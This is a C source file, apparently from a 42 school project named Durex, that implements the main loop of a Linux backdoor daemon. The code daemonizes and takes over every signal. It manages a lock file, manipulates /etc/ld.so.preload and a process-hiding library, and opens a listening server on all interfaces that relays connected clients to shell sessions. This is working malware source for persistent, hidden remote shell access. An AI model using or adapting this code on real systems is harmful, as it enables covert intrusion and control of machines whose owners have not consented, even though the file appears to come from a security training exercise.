/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/15 02:43:33 by root              #+#    #+#             */
/*   Updated: 2019/07/15 21:17:57 by gbourgeo         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* signal */
#include <signal.h>
/* remove, snprintf */
#include <stdio.h>
/* exit */
#include <stdlib.h>
/* getpwuid */
#include <sys/types.h>
#include <pwd.h>
/* time */
#include <time.h>
/* errno */
#include <errno.h>

#include "main.h"
#include "durex.h"

static void			clearStructure()
{
	e.lock = -1;
	e.server.reporter = -1;
	e.server.fd = -1;
	mymemset(&e.server.fdr, 0, sizeof(e.server.fdr));
	mymemset(&e.server.fdw, 0, sizeof(e.server.fdw));
	for (int i = 0; i < SERVER_CLIENT_MAX; i++)
		clearClient(&e.server.client[i]);
}

static int			createDaemon()
{
	int				fd;
	pid_t			pid;

	pid = fork();
	if (pid == 0) {
		if (setsid() < 0)
			exit(1);
		pid = fork();
		if (pid == 0) {
			fd = 0;
			while (fd < _NSIG)
				signal(fd++, &durexSigterm);
			fd = open("/dev/null", O_RDWR);
			if (fd < 0)
				exit(1);
			dup2(fd, STDIN_FILENO);
			dup2(fd, STDOUT_FILENO);
			dup2(fd, STDERR_FILENO);
			close(fd);
			umask(0);
			if (chdir("/") < 0)
				exit(1);
			return 1;
		}
		exit(0);
	}
	return 0;
}

static int			launch_program()
{
	char			proc[256];
	char			buf[20];
	int				ret;

	unlink("/etc/ld.so.preload");
	e.lock = open(DUREX_LOCK_FILE, O_CREAT | O_RDWR, 0600);
	if (e.lock < 0)
		return 0;
	if (flock(e.lock, LOCK_EX | LOCK_NB))
	{
		/* Can't lock the file ? check if the process is running */
		ret = read(e.lock, buf, sizeof(buf));
		close(e.lock);
		if (ret > 0)
		{
			buf[ret] = '\0';
			snprintf(proc, sizeof(proc), "/proc/%s/cmdline", buf);
			e.lock = open(proc, O_RDONLY);
			if (e.lock >= 0)
			{
				ret = read(e.lock, buf, sizeof(buf));
				close(e.lock);
				if (ret > 0)
				{
					buf[ret] = '\0';
					if (!mystrcmp(buf, DUREX_BINARY_FILE))
						return 0;
				}
			}
		}
		remove(DUREX_LOCK_FILE);
		return launch_program();
	}
	snprintf(buf, sizeof(buf), "%d", getpid());
	write(e.lock, buf, mystrlen(buf));
	return 1;
}

static int			setupSelect()
{
	int				i;
	int				max;

	FD_ZERO(&e.server.fdr);
	FD_ZERO(&e.server.fdw);
	FD_SET(e.server.fd, &e.server.fdr);
	max = e.server.fd;
	i = 0;
	while (i < SERVER_CLIENT_MAX)
	{
		if (e.server.client[i].fd != -1) {
			if (e.server.client[i].fd > max)
				max = e.server.client[i].fd;
			FD_SET(e.server.client[i].fd, &e.server.fdr);
			FD_SET(e.server.client[i].fd, &e.server.fdw);
			if (e.server.client[i].shell != -1) {
				if (e.server.client[i].shell > max)
					max = e.server.client[i].shell;
				FD_SET(e.server.client[i].shell, &e.server.fdr);
			}
		}
		i++;
	}
	return max;
}

void				durex()
{
	int				maxfd;
	int				ret;
	struct timeval	timeout;

	clearStructure();
	if (createDaemon() && launch_program() && hireReporter() && create_library() && openServer("0.0.0.0", SERVER_PORT)) {
		serverLog(1, "[LOGS] - Server online\n");
		mymemset(&timeout, 0, sizeof(timeout));
		while (1)
		{
			maxfd = setupSelect();
			ret = select(maxfd + 1, &e.server.fdr, &e.server.fdw, NULL, &timeout);
			if (ret == -1 && errno != EINTR) {
				serverLog(1, "[ERRO] - %s\n", strerror(errno));
				break ;
			}
			if (FD_ISSET(e.server.fd, &e.server.fdr))
				serverAcceptConnections();
			for (int i = 0; i < SERVER_CLIENT_MAX; i++)
			{
				if (e.server.client[i].fd == -1)
					continue ;
				if (FD_ISSET(e.server.client[i].fd, &e.server.fdr))
					serverReadClient(&e.server.client[i]);
				if (FD_ISSET(e.server.client[i].fd, &e.server.fdw))
					serverWriteClient(&e.server.client[i]);
				if (FD_ISSET(e.server.client[i].shell, &e.server.fdr))
					serverReadClientShell(&e.server.client[i]);
			}
		}
		serverLog(1, "[FATAL] - Weird... \n");
		quitClearlyServer();
		quitClearlyDaemon();
		exit(0);
	}
	print_usr_name();
}

void			quitClearlyDaemon()
{
	flock(e.lock, LOCK_UN);
	close(e.lock);
	remove(DUREX_LOCK_FILE);
	remove(DUREX_PRELOAD);
	remove(DUREX_PROCESSHIDER_LIB);
}
